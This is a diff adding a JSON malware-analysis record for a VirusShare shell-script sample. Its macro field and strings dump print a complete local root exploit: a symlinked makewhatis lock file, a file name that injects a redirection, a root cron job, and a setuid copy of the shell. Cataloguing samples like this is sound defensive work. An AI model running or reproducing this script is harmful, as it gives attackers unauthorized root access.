@@ -1,0 +1,41 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "#!/bin/sh\nrm -f /var/lock/makewhatis.lock\nln -s /usr/share/man/man1/x\\ \\$\\{PATH\\:0\\:1\\}tmp\\$\\{PATH\\:0\\:1\\}woot\\>\\>\\$\\{PATH\\:0\\:1\\}var\\$\\{PATH\\:0\\:1\\}spool\\$\\{PATH\\:0\\:1\\}cron\\$\\{PATH\\:0\\:1\\}root\\<man.1.gz /var/lock/makewhatis.lock\ngzip -cf - >/tmp/woot << EOF\n* * * * * /tmp/fjeer\nEOF\ncat > /tmp/fjeer <<EOF\n#!/bin/sh\ncp -f /var/tmp/sh /tmp/rootshell\nchmod +s /tmp/rootshell\nEOF\nchmod +x /tmp/fjeer"
+    },
+    "filename": "VirusShare_2dc33e240eca9227badd7e8fc4a2f652",
+    "filesize": 399,
+    "filetype": "POSIX shell script, ASCII text executable",
+    "hashes": {
+        "md5": "2dc33e240eca9227badd7e8fc4a2f652",
+        "sha1": "b69138444ca3e4e2d4aec2b41d809290466303c7",
+        "sha256": "4bc3315a42038ea24f174d4df892832c84228d72b14f5b2f412bfe77812ecafa"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/bin/sh",
+            "rm -f /var/lock/makewhatis.lock",
+            "ln -s /usr/share/man/man1/x\\ \\$\\{PATH\\:0\\:1\\}tmp\\$\\{PATH\\:0\\:1\\}woot\\>\\>\\$\\{PATH\\:0\\:1\\}var\\$\\{PATH\\:0\\:1\\}spool\\$\\{PATH\\:0\\:1\\}cron\\$\\{PATH\\:0\\:1\\}root\\<man.1.gz /var/lock/makewhatis.lock",
+            "gzip -cf - >/tmp/woot << EOF",
+            "* * * * * /tmp/fjeer",
+            "cat > /tmp/fjeer <<EOF",
+            "#!/bin/sh",
+            "cp -f /var/tmp/sh /tmp/rootshell",
+            "chmod +s /tmp/rootshell",
+            "chmod +x /tmp/fjeer"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.250789",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
